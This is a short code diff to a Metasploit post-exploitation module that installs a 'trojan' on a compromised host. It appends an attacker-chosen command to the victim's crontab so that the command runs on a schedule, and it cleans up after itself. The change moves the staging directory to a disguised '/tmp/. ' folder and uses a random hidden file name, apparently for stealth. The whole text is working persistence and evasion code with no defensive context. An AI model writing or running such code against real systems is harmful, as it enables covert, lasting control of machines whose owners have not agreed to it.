@@ -43,11 +43,12 @@ class Metasploit3 < Msf::Post
 	def run
 		print_status "Installing trojan to run : #{datastore['COMMAND']}"
 
-		vcmd_exec("mkdir -p /dev/'. '")
-		vcmd_exec("crontab -l > /dev/'. '/test.txt")
-		vcmd_exec('echo "0/' + datastore['FREQ'] + ' * * * * ' + datastore['COMMAND'] + '" >> ' + "/dev/'. '/test.txt")
-		vcmd_exec("crontab /dev/'. '/test.txt")
-		vcmd_exec("rm /dev/'. '/test.txt")
-		vcmd_exec("rm -Rf /dev/'. '")
+		vcmd_exec("mkdir -p /tmp/'. '")
+    file = rand_text_alpha(128)
+		vcmd_exec("crontab -l > /tmp/'. '/.#{file}")
+		vcmd_exec('echo "0/' + datastore['FREQ'] + ' * * * * ' + datastore['COMMAND'] + '" >> ' + "/tmp/'. '/.#{file}")
+		vcmd_exec("crontab /tmp/'. '/.#{file}")
+		vcmd_exec("rm /tmp/'. '/.#{file}")
+		vcmd_exec("rm -Rf /tmp/'. '")
 	end
 end
